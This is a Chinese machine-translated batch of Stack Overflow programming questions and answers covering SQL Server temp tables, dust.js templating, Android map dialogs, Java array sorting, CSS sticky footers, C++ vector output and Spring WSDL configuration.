# StackOverflow 问答 13841000-13841999

# c# - 从 C# 调用存储过程时突然删除全局临时表

> ID：13841005
> 
> 赞同：1
> 
> 时间：2012-12-12T13:35:23.420
> 
> 标签：c#, sql-server-2005

我有 2 个带有动态 sql 的存储过程（ms sql 2005）。首先他们创建临时表（##Table）并填充数据。第二个过程从第一个过程创建的临时表中选择数据。

第一个 sp：

```
set @cmd = 'create table ' + @tableName +
                            '(ORDERS_DT_ID int' +
                            ...
                            ',WAREHOUSE_RESULT numeric(15, 3)) ' +

       ' insert into ' + @tableName + ' ( ORDERS_DT_ID, ... WAREHOUSE_RESULT )' +
       ' select ro.ORDERS_DT_ID, ... ro.WAREHOUSE_RESULT ' +
         ' from WH_REMAINS_BY_ORDER_FN ( ' + cast(@orderId as varchar(10)) + ' ) as ro '

exec (@cmd) 
```

第二个 sp（例如）：

```
set @cmd =  'select r.ORDERS_DT_ID, ... r.WAREHOUSE_RESULT' +
                     ' from ' + @tableName + ' as r'

exec (@cmd) 
```

其中@tableName - sp 的输入参数（例如 = '##Table'）

我使用来自 asp.net mvc 应用程序的程序。我调用第一个过程，从 MSSMS 检查临时表（表存在）然后应用程序在断点处停止（在第二个 sp 之前），接下来我调用第二个过程并且表不存在（但在第一个和第二个过程之间调用表存在）。

```
var result = dataContext.firstSP(table, orderId).FirstOrDefault(); // create temp table and fill data (+ return status)

var data = dataContext.secondSP( table, orderId ).AsQueryable(); // before execute we have temp table (check from MSSMS) and we have error after execute that code. 
```

如果我们在第二个过程中检查临时表，我们可以看到该表不存在：

```
if object_id ( N'tempdb.dbo.' + ltrim(@tableName) ) is null
begin
    exec dbo.firstSP @tableName, @orderId            
end 
```

当我们运行第二个 sp 时，为什么第一个 sp 的临时表会丢失？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:39:41.273

一旦创建会话结束并且没有从另一个会话主动查询，全局临时表就会被删除。

如果您想控制生命周期，请创建一个永久表（可能在`tempdb`）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T13:44:19.740

当没有打开的连接查询全局临时表时，它们会自动删除。这是最可能的原因。就个人而言，无论如何，我不会将其作为对数据库的两个单独调用来执行。

我的建议是将第一个 SP 转换为表值函数，然后第二个 SP 可以简单地查询 TVF。这避免了执行 DDL 来进行两个单独的数据库调用的需要，并且通常会更容易。

那就是如果你真的想要一个临时表。如果您希望此生成的表在单次使用后保留更长的时间，请不要使用临时表。

# php - 使用 Plupload 上传和压缩多个文件

> ID：13841010
> 
> 赞同：0
> 
> 时间：2012-12-12T13:35:42.207
> 
> 标签：php, javascript, jquery, zip, plupload

我正在使用自定义[Plupload](http://www.plupload.com/index.php)来在网站上上传文件。我希望能够在上传多个文件时创建一个 zip。现在 upload.php 一次上传一个文件，所以我不能一次压缩每个人。那么你们将如何解决这个问题呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T08:05:37.627

这应该很简单。

1.  确保您识别用户。让他们登录，或以其他方式为他们附加标识符。
2.  确保标识符可用于接收上传的脚本。会话对此很方便，但[`multipart_params`](http://www.plupload.com/documentation.php)如果需要，您也可以使用。
3.  处理上传的文件时，将其存放在某处并记下它的存放位置。将有关文件位置的信息粘贴到您以后可以轻松访问的位置，例如您的数据库。如果您没有数据库，那么您将其保留在他们的会话中~~有什么问题。~~
4.  当用户上传完所有文件后，让他们继续到下一页，然后可以遍历所有上传的文件并创建您的 zip。

问题和注意事项：

*   已上传但用户已放弃的文件会发生什么情况？
*   如果上传处理程序无法识别用户，应该怎么做？
*   再次提醒我，为什么不让用户自己创建 zip 文件呢？说真的，每个现代操作系统都有 zip 支持，通常甚至是*内置的*.

# node.js - 灰尘-linkedin 浏览器与节点渲染：object[property] 而不是 object.property

> ID：13841015
> 
> 赞同：3
> 
> 时间：2012-12-12T13:35:54.680
> 
> 标签：node.js, express, linkedin, dust.js

我在灰尘测试页面[http://linkedin.github.com/dustjs/test/test.html](http://linkedin.github.com/dustjs/test/test.html)上玩灰尘示例，同时在 node.js (0.8.15)、express.js(3.0.4 ), consolidate(0.0.5),dust-linkedin(1.1.1)。

如果我在灰尘测试页面上执行我的模板（请参阅顶部的链接），它运行良好：

```
<a href="/en/subjects/subject-1-page-id">subject 1 title en</a> 
```

它呈现**主题 1 标题 en**

如果我在 node/express/consolidate/dust 上执行我的模板，则会显示：

```
<a href="/en/subjects/subject-2-page-id">{locale[lang].title}</a> 
```

它呈现**{locale[lang].title}**

这是我的模板：

```
{#subjects lang=language}
<div>
    <img src="/files/subjects/{logo}" />
    <div>
        <a href="/{lang}/subjects/{pageId}">{locale[lang].title}</a>
    </div>
</div>
{~n}
{/subjects} 
```

这是我的 JSON 对象：

```
{
    language: 'en',
    subjects: [
        { 
            logo: 'subject1.jpg', 
            pageId: 'subject-1-page-id', 
            locale: { 
                en: { title: 'subject 1 title en' }, 
                fr: { title: 'subject 1 title fr' },
            }
        }
    ]
} 
```

这是来自灰尘测试站点的渲染模板：

```
<div>
    <img src="/files/subjects/subject1.jpg" />
    <div>
        <a href="/en/subjects/subject-1-page-id">subject 1 title en</a>
    </div>
</div> 
```

这里是从 node/express/consolidate/dust-linkedin 渲染的模板

```
<div>
    <img src="/files/subjects/subject1.jpg" />
    <div >
        <a href="/en/subjects/subject-1-page-id">{locale[lang].title}</a>
    </div>
</div> 
```

这是来自灰尘测试页面的编译模板的一部分（请参阅顶部的链接）：

```
.write("\">").reference(ctx.getPath(false, ["locale", ctx.get("lang"), "title"]), ctx, "h").write("</a></div></div>\n"); 
```

这是我使用**{locale[lang].title}**时在服务器上编译的部分。

```
.write("\">{locale[lang].title}</a></div></div>\n"); 
```

这是我使用**{locale.en.title}时在服务器上编译的部分**

```
.write("\">").reference(ctx.getPath(false, ["locale", "en", "title"]), ctx, "h").write("</a></div></div>\n"); 
```

如果我尝试在节点上渲染**{locale.en.title}** - 它可以工作。

请注意**lang**变量始终在 <a href='/ **en** / ...> 链接中起作用

我的问题是：为什么在浏览器灰尘中解析我的路径很好，但在节点上不起作用？或者，如何使用“类数组”键访问来呈现对象

# android - DialogFragment 中的 MapFragment

> ID：13841016
> 
> 赞同：2
> 
> 时间：2012-12-12T13:35:58.727
> 
> 标签：android, android-dialogfragment, mapfragment

有没有办法使用 a`MapFragment`或 a`SupportMapFragment`扩展 a`DialogFragment`以显示为弹出窗口，与显示 DatePicker 的方式相同？我想构建它以让用户从地图中选择一个 LatLng。我不想将`MapFragment`直接放入表单中，因为它由`ScrollView`. 感谢您提供可能的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-24T04:15:56.253

如果要将地图片段嵌入到对话框片段中，可以使用 Android 4.2 (ver 17) 中实现的嵌套片段功能。[直接来自android 4.2 api 页面](http://developer.android.com/about/versions/android-4.2.html#NestedFragments)的示例：

```
Fragment videoFragment = new VideoPlayerFragment();
FragmentTransaction transaction = getChildFragmentManager().beginTransaction();
transaction.add(R.id.video_fragment, videoFragment).commit(); 
```

如果您希望从 1.6 版本开始兼容，您也可以导入 v4.support 库的片段类。使用支持库的一个缺点是您还必须使用支持库中的对话框片段。这可能会产生级联效应，要求当您动态使用对话框片段时，片段库必须来自支持库。如果你已经使用了 posthoneycomb 现代 android 库，你将无法混合使用支持库。

如果您的应用程序已经在使用支持库，一切都很好。但情况可能并非如此。如果您属于此类别，那么您想使用 mapview 而不是 mapfragment。只需在 xml 中创建一个布局（例如 framelayout），然后在代码中动态地将一个新的 mapview 实例添加到这个布局中。

# sql-server - 何时拆分数据库表而不是添加更多列 - 性能 - 数据库设计

> ID：13841018
> 
> 赞同：2
> 
> 时间：2012-12-12T13:36:05.577
> 
> 标签：sql-server, performance, database-design, split

问题是添加更多列或拆分数据库表。

假设我有一张桌子，里面有：

```
UserId - Primary Key
Col1
Col2
Col3 
```

现在我将另一个数据保留为 Col4 Col5，但此数据并非对每个 UserId 都有效。

假设我的主表中有 200 万条记录，而这些附加数据仅对 25000 条记录有效。所以问题是：我应该将另一个表组成为

```
UserId - Primary Key
Col4
Col5 
```

或者

使用我的主表作为

```
UserId - Primary Key
Col1
Col2
Col3
Col4
Col5 
```

我应该走哪条路？我关心性能。这些额外的 cols 是**tinyint**，默认为 0 而不是 null。

SQL 服务器 2008 R2

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T15:00:19.350

你没有说你现有的领域是什么。而且，没有称为“tinyBit”的数据类型。

即便如此，也有两种可能的影响情况：

1）您的表已经包含一个位列，并且您正在添加两个位列

在这种情况下，由于位存储在压缩字节中，因此性能差异无论如何都可以忽略不计。

2）您的表不包含位列，或者您正在添加 tinyint 列

在这种情况下，性能会受到影响——因为每行会有额外的信息。但是，2,000,000 条记录一点也不大。消除在同一行中存储额外列的成本的一种简单方法是添加一个索引，该索引用于`INCLUDE`包含 Col1、Col2 和 Col3 列。在这种情况下，查询优化器 (QO) 通常会在包含列的索引上选择索引查找，而不是聚集索引查找，因为它的成本会更低。

编辑-> 鉴于您的说明，案例 2) 适用，并且创建包含相关列的索引可能会比任何现有的集群查找提高性能。会有插入成本 - 因此它是否值得取决于表的读/写平衡。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T14:52:45.473

对于只有 2M 行，可以肯定地说您应该将其保存在一个表中。

MS SQL Server 有效地存储 NULL 值（在理想情况下只有一位*）*，因此您需要许多列和非常特定的 NULL 分布才能看到任何存储节省。

Normally, vertical partitioning is done for better caching locality, but 2M rows will typically fit in memory anyway these days, so I doubt you'll be able to see any difference there either. You will see a (negative) difference because of the JOIN, though.

In any case, don't do anything blindly. **Measure** on realistic amounts of data with representative workloads and only make a decision after you know what the impact will be.

# google-bigquery - Google BigQuery - 中等大小的连接，后端错误

> ID：13841023
> 
> 赞同：1
> 
> 时间：2012-12-12T13:36:20.067
> 
> 标签：google-bigquery

我正在尝试在一个有 40,514 行（小于 1 Mb 的表）的表和一个有 4,359,682 行（~450MB）的表之间进行内部连接。

过去，我成功地执行了此类连接，并且我相信我遵守了 10MB 的小连接大小限制，但是当我尝试执行此操作时出现后端错误。在过去，我会将较小的表减半并进行两次连接并聚合它们，但在这种情况下，这不是一个选择。

我希望得到更多信息的错误消息，有谁知道导致此错误的问题是什么？

我的项目编号是 340400313423

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T00:59:36.450

据我所知，您在过去一周使用 JOIN 查询时遇到了 5 个错误：

```
QUERY_ERROR    Encountered "" at line 1, column 63\. Was expecting one of:
INVALID_VALUE  Unknown field: Channel
QUERY_ERROR    BAD_QUERY (YT_Account appears in GROUP BY, but it is not a named column in SELECT)
INVALID_VALUE  Table raw has no field c.Policy
INVALID_VALUE  Unknown field: Policy 
```

这些都与您正在执行的 JOIN 的大小无关。如果您查看响应的其余部分，您应该会得到更多信息错误。

# r - 访问大数据框时出错

> ID：13841024
> 
> 赞同：2
> 
> 时间：2012-12-12T13:36:24.120
> 
> 标签：r

我正在阅读一个数据框，并且该消息`fread(273) failed on DBF file`重复了很多次。阅读代码很简单：

```
dataset <- read.dbf(fl, as.is = FALSE) 
```

我正在读取的 dbf 文件是多个 dbf 文件的总和，这些文件总共包含 873.259 个，因为我在此过程中对它们进行了计数。我已经使用了 rbind 和 ldply。

我已经检查了数据框的大小限制，但在这种情况下似乎不是问题。任何人都可以帮助我吗？

# java - java 二进制文件不附带 openjdk-6-jdk？

> ID：13841025
> 
> 赞同：0
> 
> 时间：2012-12-12T13:36:28.443
> 
> 标签：java, openjdk

我一定要发疯了，并且遗漏了一些明显的东西，但是我根本无法理解这一点，因此我们将不胜感激。

我正在一台新的 Ubuntu 12.10 机器上安装 java 6。我愿意：

```
sudo aptitude install openjdk-6-jdk 
```

据说可以安装所有东西。但由于某种原因，它几乎没有 jre：

```
richard@holly:/usr/lib/jvm/java-6-openjdk-amd64/jre/bin$ ls -atl
total 48
drwxr-xr-x 2 root root  4096 Dec 12 11:54 .
drwxr-xr-x 5 root root  4096 Dec 12 11:54 ..
-rwxr-xr-x 1 root root 39600 Oct 24 18:54 policytool 
```

我试过安装openjdk-6-jre，但它说它已经安装了。

完全一头雾水。我错过了什么？

干杯，

理查德

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:02:14.500

当您安装 openjdk-6-jre 时，它​​应该还包含其依赖项 openjdk-6-jre-headless，它是包含 java 二进制文件的包。

/usr/lib/jvm/java-6-openjdk-amd64/jre/bin 目录的内容直接由包填充。如果缺少文件，则系统存在严重问题。

`dpkg -l`您应该使用以下命令确认两个软件包都已安装：

```
dpkg -l openjdk-6-jre openjdk-6-jre-headless
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                     Version                  Description
+++-========================-========================-================================================================
ii  openjdk-6-jre            6b24-1.11.5-0ubuntu1~12\. OpenJDK Java runtime, using Hotspot JIT
ii  openjdk-6-jre-headless   6b24-1.11.5-0ubuntu1~12\. OpenJDK Java runtime, using Hotspot JIT (headless) 
```

如果由于某种原因未安装 openjdk-6-jre-headless，则安装它。

/usr/bin 中应该有由 openjdk-6-jre 和 openjdk-6-jre-headless postinst（安装后）脚本创建的 java 和其他可执行文件的链接。如果您想检查 postinst 脚本，它们和 /var/lib/dpkg/info 中的其他包脚本作为 .postinst。

作为一个方便的提示，与此类似的命令将列出指向非链接终止符的符号链接链。

```
f=/usr/bin/java; while [ -h $f ]; do ls -l $f; f=$(readlink $f); done; ls -l $f 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T13:49:29.133

您可以使用 dpkg-query 找出包中包含哪些文件：

`dpkg-query -L openjdk-6-jdk`

...这将显示 java 可执行文件的位置为 /usr/lib/jvm/java-6-openjdk-$ARCH/bin （$ARCH 是您的架构）。

# java - 根据一行数据对二维数组进行排序

> ID：13841028
> 
> 赞同：3
> 
> 时间：2012-12-12T13:36:37.757
> 
> 标签：java, arrays

我不确定标题是否正确地暗示了我要问的问题。假设我有一个二维 int 数组，如下所示：

```
int[][] x={{1,7,6},{2,4,8}}; 
```

现在我想对第一行进行升序排序，第二行的数据排序后必须在同一列，即排序后的数组应该是这样的：

```
x={{1,6,7},{2,8,4}} 
```

正确的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T13:38:51.537

这可以通过实现您自己的排序例程来完成，但更好的方法是重构。

尝试将数据封装为一组数字对，每对数字都包含在自己的对象中。然后，您可以对第一个值进行排序并访问任一值。

```
class Pair<T extends Comparable<T>> implements Comparable<Pair<T>> {
  final T a;
  final T b;

  public Pair ( T a, T b ) {
    this.a = a;
    this.b = b;
  }

  @Override
  public int compareTo(Pair<T> o) {
    // Comparison on 'a' only.
    return a.compareTo(o.a);
  }

  @Override
  public String toString () {
    return "{" + a + "," + b + "}";
  }
}

public static void main(String args[]) {
  Pair[] pairs = {
    new Pair(1,2),
    new Pair(7,4),
    new Pair(6,8),
  };
  System.out.println("Before: "+Arrays.toString(pairs));
  Arrays.sort(pairs);
  System.out.println("After: "+Arrays.toString(pairs));
} 
```

印刷

```
Before: [{1,2}, {7,4}, {6,8}]
After: [{1,2}, {6,8}, {7,4}] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-12T13:41:51.443

这可以通过实现您自己的排序算法并在第二行中移动值来完成。

您可能有一个对象数组。每个对象都将保留值。然后实现您的自定义比较器并使用排序功能。

我还有一个想法：重新排列数组（如果可以的话）。然后将对保存在一个 int[] 表中。外部表是 int 表的容器：

```
int [][] a = {{2,5},{1,4},{3,6}};
Arrays.sort(a, new Comparator<int[]>() {
        @Override
        public int compare(int[] p_o1, int[] p_o2) {
            return Integer.valueOf(p_o1[0]).compareTo(p_o2[0]);
        }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T13:39:27.270

最简单的方法是创建一个`Pair`包含对的对象，并使用仅比较 Pair 的第一项的自定义比较器对 Pair 的集合进行排序。

如果需要，您始终可以将您的 Pairs 转换回 2D 数组。

这可能不是最有效的方法，但对于大多数用例来说应该足够好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T13:43:02.273

如果第一行的所有元素都是唯一且非空的，您可以在排序之前填充一个映射，其中第一行元素指向它们的第二行对应元素。对第一行进行排序后，您可以使用地图查找第一行（已排序）与第二行的对应元素。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T13:51:24.887

你基本上是在做一个`Map`，你为什么不使用一个`Map`实现来帮助你呢？

`TreeMap`implements `SortedMap`，因此一个简单的解决方案是将所有映射值放入其中：

```
SortedMap<Integer, Integer> map = new TreeMap<Integer, Integer>();
map.put(1, 2);
map.put(7, 4);
map.put(6, 8);

// You can iterate over map now, it'll be already sorted
for(Map.Entry<Integer, Integer> entry: map.entrySet())
{
    System.out.println(entry.getKey()+" : "+entry.getValue());
}

// This is not really necessary
Integer[][] x = {map.keySet().toArray(new Integer[0]), map.values().toArray(new Integer[0])};

// If you have Apache Commons you can:
int[][] y = {ArrayUtils.toPrimitive(map.keySet().toArray(new Integer[0])), ArrayUtils.toPrimitive(map.values().toArray(new Integer[0]))}; 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-12T13:57:26.887

[我从http://www.algolist.net/Algorithms/Sorting/Quicksort](http://www.algolist.net/Algorithms/Sorting/Quicksort)复制粘贴的 qSort 并稍作修改

```
 public static void main(String[] args) throws Exception {
        int[][] x = { { 1, 7, 6 }, { 2, 4, 8 } };
        qsort(x[0], x[1], 0, x[0].length - 1);
        System.out.println(Arrays.deepToString(x));
    }

    static void qsort(int[] x0, int[] x1, int left, int right) {
        int index = partition(x0, x1, left, right);
        if (left < index - 1)
            qsort(x0, x1, left, index - 1);
        if (index < right)
            qsort(x0, x1, index, right);
    }

    static int partition(int[] x0, int[] x1, int left, int right) {
        int i = left, j = right;
        int tmp;
        int pivot = x0[(left + right) / 2];
        while (i <= j) {
            while (x0[i] < pivot)
                i++;
            while (x0[j] > pivot)
                j--;
            if (i <= j) {
                tmp = x0[i];
                x0[i] = x0[j];
                x0[j] = tmp;

                // swap x1 too
                tmp = x1[i];
                x1[i] = x1[j];
                x1[j] = tmp;

                i++;
                j--;
            }
        }
        return i;
    }
} 
```

这个程序打印

```
[[1, 6, 7], [2, 8, 4]] 
```

这可能看起来很长，但通常对于算法效率是至关重要的，而且这个解决方案似乎是最快的

# html - 应用粘性页脚，无法使用页眉设置内容 Div 高度

> ID：13841035
> 
> 赞同：1
> 
> 时间：2012-12-12T13:37:10.237
> 
> 标签：html, css, sticky-footer

这太基础了，我不好意思贴出来。

基本上每当我在 wrap div 内添加横幅时，主 div 都不会保持它的高度。我一辈子都无法让它延伸到页脚。将标头从包装标签中取出也无济于事。

彻底搜查，一无所获！对不起这样的基本问题

原始代码来自[http://www.cssstickyfooter.com/](http://www.cssstickyfooter.com/)

HTML

```
<html>
<body>
<head>
<link rel="stylesheet" type="text/css" href="testcss.css">
</head>
<div id="wrap">
<div id="header">
<img src="banner.png">
</div>
<div id="main">

</div>

</div>

<div id="footer">

</div>
</body>
</html> 
```

CSS

```
 /*  
Sticky Footer Solution
by Steve Hatcher 
http://stever.ca
http://www.cssstickyfooter.com
*/

* {margin:0;padding:0;} 

/* must declare 0 margins on everything, also for main layout components use padding, not 
vertical margins (top and bottom) to add spacing, else those margins get added to total height 
and your footer gets pushed down a bit more, creating vertical scroll bars in the browser */

html, body {height: 100%;}

#wrap {
    min-height: 100%;
    background-color: #666;
    width: 100%;}
#header
{
    width: 800px;
    margin-right: auto;
    margin-left: auto;
}
#main 
{   overflow:auto;
    padding-bottom: 150px; /* must be same height as the footer */
    background-color: #FFF;
    height: 100%;}  

#footer
    {position: relative;
    margin-top: -150px; /* negative value of footer height */
    height: 150px;
    clear:both;
    background-color: #333;} 
```

# visual-c++ - 为了调用 `cout << std::vector<_Ty>` 要包含哪个标头？

> ID：13841036
> 
> 赞同：0
> 
> 时间：2012-12-12T13:37:11.907
> 
> 标签：visual-c++, vector, header-files, cout

我正在尝试遵循[Boost Program Options 库教程的](http://www.boost.org/doc/libs/1_52_0/doc/html/program_options/tutorial.html#id2607297)*选项详细信息*部分，但出现以下错误：

```
error C2679: "binary '<<' : no operator found which takes a right-hand operand
of type 'const std::vector<_Ty>'" (or there is no acceptable conversion) 
```

我的代码如下。我猜我需要包含一个标题，但我不知道是哪个。

```
#include <boost/program_options.hpp>
#include <iostream>
#include <vector>
#include <string>

using std::cout;
using std::endl;
using std::vector;
using std::string;

namespace po = boost::program_options;

int options_description(int ac, char* av[])
{
    int opt;
    po::options_description desc("Allowed options");
    desc.add_options()
        ("help", "produce help message")
        ("optimization", po::value<int>(&opt)->default_value(10), 
            "optimization level")
        ("include-path,I", po::value< vector<string> >(), "include path")
        ("input-file", po::value< vector<string> >(), "input file")
    ;

    po::positional_options_description p;
    p.add("input-file", -1);

    po::variables_map vm;
    po::store(po::command_line_parser(ac, av).
        options(desc).positional(p).run(), vm);
    po::notify(vm);

    if (vm.count("include-path"))
    {
        cout << "Include paths are: " 
             << vm["include-path"].as< vector<string> >() << "\n"; // Error
    }

    if (vm.count("input-file"))
    {
        cout << "Input files are: " 
             << vm["input-file"].as< vector<string> >() << "\n"; // Error
    }

    cout << "Optimization level is " << opt << "\n";   

    return 0;
}

int main(int argc, char *argv[])
{
    return options_description(argc, argv);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:09:59.630

严格来说不是我的问题的答案（我更喜欢这样做的标准库功能），但我发现类似的问题有一个答案，该答案提供了一个在接受对象的类上实现`<<`运算符的类：`ostream``vector`

```
template<class T>
std::ostream& operator <<(std::ostream& os, const std::vector<T>& v)
{
    std::copy(v.begin(), v.end(), std::ostream_iterator<T>(std::cout, " ")); 
    return os;
} 
```

我将它添加到我的代码中，它现在可以编译。太糟糕了，这在教程中没有提到。

来源：[带有 boost 库 C++ 的向量字符串给出错误](https://stackoverflow.com/questions/9413194/vector-string-with-boost-library-c-gives-error)

# html - 具有拖放功能的 HTML 工作流设计器

> ID：13841038
> 
> 赞同：14
> 
> 时间：2012-12-12T13:37:16.917
> 
> 标签：html, html5-canvas

我需要构建一个工作流工具，允许人们将节点拖到画布上，将节点的出口连接到其他节点的输入..缩放..（我刚刚发现的一个示例看起来像“自动化”部分中介绍的示例这里：[http](http://bronto.com/platform/features) ://bronto.com/platform/features ）

寻找关于如何开始的建议......好奇是否有任何人推荐的框架/库使这更容易，或者只是确认我应该开始使用 Javascript 来处理拖放/画线/等。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2016-02-14T22:21:45.780

这个问题已经很老了，但如果有人需要更新的答案，我肯定会尝试 jQuery 开源项目 jsPlumb [https://github.com/sporritt/jsPlumb](https://github.com/sporritt/jsPlumb)。

[![流程图生成器演示](../Images/ea0231db4df9cd2ba809ec51d99c3aab.png)](https://i.stack.imgur.com/oK62E.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-20T21:37:18.537

如果您在 ASP.NET 平台上，请尝试[Orchard CMS](http://www.orchardproject.net/)。它有一个[工作流程模块](http://www.davidhayden.me/blog/orchard-workflow-module)，您可以根据自己的需要进行定制。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-03-03T17:04:26.320

我尝试了几种工作流程、流程图和图表工具。

我找到了一个，然后我可以用编辑器制作一个 HTML5 工作流程图，从服务器加载和保存数据。

这几乎具有可用于制作工作流程图的所有功能：

1) 矩形内的富文本。

2）能够自定义形状。

3）能够添加流程图符号和修复后端代码。

4) 适用于 Android、iOS、HTML5 浏览器。

5）能够添加不同类型的线条以附加到不同的形状和对象。

6) 能够正确拖放元素、线条、形状和富文本。

7) 能够创建自己的元素（便签、UML 对象、行车道、文档对象等）

麻省理工学院许可。

[https://code.google.com/p/svg-edit/](https://code.google.com/p/svg-edit/)

# c# - 如何将单引号转换为破折号并删除双引号？

> ID：13841039
> 
> 赞同：-4
> 
> 时间：2012-12-12T13:37:18.150
> 
> 标签：c#, .net

我想将单引号转换为破折号并删除字符串中嵌入的双引号。

例如，如果我有一个字符串 8'5" 它应该是 "8-5"

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T13:39:20.000

请用：

```
str = str.Replace('\'', '-').Replace("\"", string.Empty) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T13:40:55.650

您需要`\`转义`'`，然后您可以使用[`string.Replace`](http://msdn.microsoft.com/en-us/library/czx8s9ts.aspx)：

```
string original = "8'5";
string newString = original.Replace('\'', '-'); 
```

[**演示**](http://ideone.com/XOEVZT)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-12T13:42:27.533

您是否尝试过查看任何 C# 语言参考资料？你问的是非常基本的。以下代码是一种快速而肮脏的方式来满足您的要求：

```
string measurement = "8'5\"";
measurement = measurement.Replace("'", "-").Replace("\"", ""); 
```

反斜杠用于转义双引号。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-12T13:57:29.040

为了更好地理解：

```
 string str = "8\'5\"";

        //one row version
        str = str.Replace('\'', '-').Insert(0, "\"");
        Console.WriteLine(str);            

        //multi row version, just for understanding
        str = "8\'5\"";            
        str = str.Replace('\'', '-');            
        str = str.Insert(0, "\""); 
```

# spring - 如何从 wsdl 文件中的属性文件中读取？

> ID：13841042
> 
> 赞同：3
> 
> 时间：2012-12-12T13:37:30.413
> 
> 标签：spring, jakarta-ee, maven

**我在src/wsdl**下有 wsdl 文件，我想知道是否可以从这个 wsdl 文件中的属性文件中读取值，如下所示：

```
<?xml version="1.0" encoding="UTF-8"?><!-- Published by JAX-WS RI at http://jax-ws.dev.java.net. RI's version is JAX-WS RI 2.1.3-b02-. --><!-- Generated by JAX-WS RI at http://jax-ws.dev.java.net. RI's version is JAX-WS RI 2.1.3-b02-. --><definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tns="http://AXLInterface.jaxws.AllInOne.org/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="http://schemas.xmlsoap.org/wsdl/" targetNamespace="http://AXLInterface.jaxws.AllInOne.org/" name="AXLInterfaceService">
<types>
<xsd:schema>
<xsd:import namespace="http://AXLInterface.jaxws.AllInOne.org/" schemaLocation="${wsdl.url}/AXLInterface?xsd=1"></xsd:import>
</xsd:schema>

</definitions> 
```

我在 applicationContext 中定义了**PropertyPlaceholderConfigurer**，如下所示：

```
<bean id="propertyConfigurer"
        class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
        <property name="locations">
            <list>
                <value>classpath:messages/application.properties</value>
                <value>file:${APP_HOME}/Common/Conf/app.properties
                </value>
            </list>
        </property>

        <property name="ignoreResourceNotFound" value="true" />
        <property name="searchSystemEnvironment" value="true" />
        <property name="systemPropertiesModeName" value="SYSTEM_PROPERTIES_MODE_OVERRIDE" />
    </bean> 
```

当我尝试编译应用程序时，我在 wsdl 文件中遇到错误：

```
[ERROR] Unable to parse "${wsdl.url}/AXLInterface?xsd=1" : Illegal character in path at index 1: ${wsdl.url}/AXLInterface?xsd=1

[ERROR] java.net.URISyntaxException: Illegal character in path at index 1: ${wsdl.url}/AXLInterface?xsd=1 
```

请告知如何做到这一点，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T13:40:23.063

只需将 WSDL 文件定义为资源，以便 Maven 对其进行过滤。但是属性值应该在 Maven 配置文件中，而不是在属性文件中。

```
<resource>
    <directory>src/wsdl</directory>
    <filtering>true</filtering>
</resource> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T22:26:01.697

这是假设您正在使用 MessageDispatchServlet。

在您的 web.xml 中使用以下内容。这里的重要部分是 transformWsdlLocation 和 wsdlDefinitionHandlerAdapterBeanName。TransformWsdlLocation 最近作为 spring ws 2.1.2 的一部分进行了更改，以修改 schemaLocation。 [https://jira.springsource.org/browse/SWS-791](https://jira.springsource.org/browse/SWS-791)

```
<servlet>
    <servlet-name>spring-ws</servlet-name>
    <servlet-class>org.springframework.ws.transport.http.MessageDispatcherServlet</servlet-class>
    <init-param>
        <param-name>transformWsdlLocations</param-name>
        <param-value>true</param-value>
    </init-param>
    <init-param>
       <param-name>wsdlDefinitionHandlerAdapterBeanName</param-name>
       <param-value>myWsdlDefinitionHandlerAdapter</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet> 
```

接下来，在您的 spring-ws-servlet.xml 配置文件名中，有一个名为 myWsdlDefinitionHandlerAdapter 的 bean。您可以从属性文件或您需要从任何地方获取的值。

接下来是扩展spring WsdlDefinitionHandlerAdapter 的类MyWsdlDefinitionHandlerAdapter。在我的示例中，我通过修改服务器位置来更改 wsdl 位置。

```
public class MyWsdlDefinitionHandlerAdapter extends WsdlDefinitionHandlerAdapter {

private String serverAlias;

@Override
protected String transformLocation(String location, HttpServletRequest request) {
    if(StringUtils.hasText(getServerAlias())){
        StringBuilder url = new StringBuilder(request.getScheme());
        url.append("://").append(getServerAlias());
        if (location.startsWith("/")) {
            // a relative path, prepend the context path
            url.append(request.getContextPath()).append(location);
            return url.toString();
        }
        else {
            int idx = location.indexOf("://");
            if (idx != -1) {
                // a full url
                idx = location.indexOf('/', idx + 3);
                if (idx != -1) {
                    String path = location.substring(idx);
                    url.append(path);
                    return url.toString();
                }
            }
        }
    } else {
        return super.transformLocation(location, request);
    }

    // unknown location, return the original
    return location;
}

public String getServerAlias() {
    return serverAlias;
}

public void setServerAlias(String serverAlias) {
    this.serverAlias = serverAlias;
}
} 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-23T20:21:48.183

